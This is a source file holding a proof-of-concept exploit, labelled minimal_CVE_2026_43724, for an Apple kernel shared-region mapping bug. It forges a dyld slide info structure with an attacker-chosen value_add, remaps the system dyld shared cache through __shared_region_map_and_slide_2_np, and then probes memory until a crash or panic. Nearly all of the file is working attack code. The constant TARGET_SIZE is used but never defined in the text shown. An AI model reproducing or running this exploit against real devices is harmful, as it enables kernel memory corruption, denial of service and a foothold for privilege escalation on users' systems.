@import Darwin;

#define VM_PROT_ZF      0x10
#define VM_PROT_SLIDE   0x20
#define VM_PROT_NOAUTH  0x40

#define printf(...) _simple_dprintf(1, __VA_ARGS__)

typedef struct shared_file_np {
    int sf_fd;
    uint32_t sf_mappings_count;
    uint32_t sf_slide;
} shared_file_np;

typedef struct shared_file_mapping_slide_np {
    mach_vm_address_t       sms_address;
    mach_vm_size_t          sms_size;
    mach_vm_offset_t        sms_file_offset;
    user_addr_t             sms_slide_size;
    user_addr_t             sms_slide_start;
    vm_prot_t               sms_max_prot;
    vm_prot_t               sms_init_prot;
} shared_file_mapping_slide_np_t;

typedef struct dyld_cache_slide_info5 {
    uint32_t    version;            // currently 5
    uint32_t    page_size;          // currently 4096 (may also be 16384)
    uint32_t    page_starts_count;
    uint32_t    _unused_pad;
    uint64_t    value_add;
    uint16_t    page_starts[1024 /* page_starts_count */];
} dyld_cache_slide_info5;

extern void _simple_dprintf(int __fd, const char *__fmt, ...);
extern int __shared_region_check_np(uint64_t* startaddress);
extern int __shared_region_map_and_slide_2_np(uint32_t files_count, const struct shared_file_np files[], uint32_t mappings_count, const struct shared_file_mapping_slide_np mappings[]);
struct dyld_cache_slide_info5 fakeSlideInfo __attribute__((used, aligned(0x4000), section("__DATA,__data")));

static uint64_t target_map_base(uint64_t map_index) {
    return 0x180000000 + map_index * (uint64_t)TARGET_SIZE;
}

int minimal_CVE_2026_43724(void) {
    printf("hello here\n");
    
    int dscFd = open("/System/Cryptexes/OS/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e", O_RDONLY, 0);
    fakeSlideInfo = (struct dyld_cache_slide_info5){
        .version = 5,
        .page_size = 0x4000,
        .page_starts_count = 512 + 2,
        .value_add = 0x4141414141414141,
        .page_starts = { [0 ... 512 - 1] = 0x8000 },
    };
    
    uint32_t numFiles = 2;
    uint32_t mapsCount = 2;
    shared_file_np files[numFiles + 1];
    struct shared_file_mapping_slide_np maps[mapsCount + 1];
    
    files[0] = (shared_file_np){ -1, 1, 0 };
    files[1] = (shared_file_np){ dscFd, mapsCount, 0 };
    maps[0] = (shared_file_mapping_slide_np_t){
        .sms_address = 0x182000000,
        .sms_size = 0x4000,
        .sms_file_offset = (mach_vm_offset_t)&fakeSlideInfo,
        .sms_slide_size = 0,
        .sms_slide_start = 0,
        .sms_max_prot = VM_PROT_READ | VM_PROT_WRITE,
        .sms_init_prot = VM_PROT_READ | VM_PROT_WRITE,
    };
    for (uint64_t i = 0; i < mapsCount; i++) {
        maps[i+1] = (shared_file_mapping_slide_np_t){
            .sms_address = target_map_base(i),
            .sms_size = TARGET_SIZE,
            .sms_file_offset = 0,
            .sms_slide_size = sizeof(dyld_cache_slide_info5),
            .sms_slide_start = 0x182000000,
            .sms_max_prot = VM_PROT_READ | VM_PROT_WRITE | VM_PROT_SLIDE,
            .sms_init_prot = VM_PROT_READ | VM_PROT_WRITE | VM_PROT_ZF,
        };
    }
    
    int result = __shared_region_map_and_slide_2_np(numFiles, files, mapsCount + 1, maps);
    printf("result: %d, errno: %d\n", result, errno);
    
    uint64_t dscBase = 0;
    if (__shared_region_check_np(&dscBase) || !dscBase) {
        printf("No shared region available?\n");
        __builtin_trap();
    }
    printf("dsc base: 0x%llx\n", dscBase);
    
    printf("faulting till crash or panic");
    for (uint64_t i = dscBase; i < (dscBase+0x2000000); i+= 0x4000) {
        uint64_t *val = (void *)i;
        if(*val) printf("fault %p = 0x%llx\n", val, *val);
    }
    
    printf("sleeping...\n");
    while (true) {
        sleep(1000);
    }
    return 0;
}
